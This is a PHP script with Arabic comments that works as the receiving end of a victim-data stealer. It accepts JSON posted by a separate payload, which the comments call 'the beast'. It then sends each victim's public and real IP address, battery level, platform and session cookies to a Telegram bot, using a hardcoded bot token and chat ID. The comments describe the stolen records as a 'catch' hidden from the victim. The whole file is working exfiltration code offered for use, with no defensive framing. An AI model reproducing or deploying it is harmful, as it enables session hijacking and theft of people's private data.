<?php
// بياناتك الخاصة - مخفية عن الضحية تماماً
$token = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
$chat_id = "5811700860";

// استقبال البيانات القادمة من "الوحش"
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    $msg = "🔥 *صيدة جديدة من الوحش الكاسر (API)* 🔥\n\n";
    $msg .= "🌐 *IP العام:* " . $data['ip'] . "\n";
    $msg .= "📍 *IP الحقيقي:* " . $data['real_ip'] . "\n";
    $msg .= "🔋 *البطارية:* " . $data['battery'] . "\n";
    $msg .= "📱 *النظام:* " . $data['platform'] . "\n";
    $msg .= "🍪 *SESSION:* \n`" . $data['cookies'] . "`\n";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
    file_get_contents($url);
    echo json_encode(["status" => "success"]);
}
?>
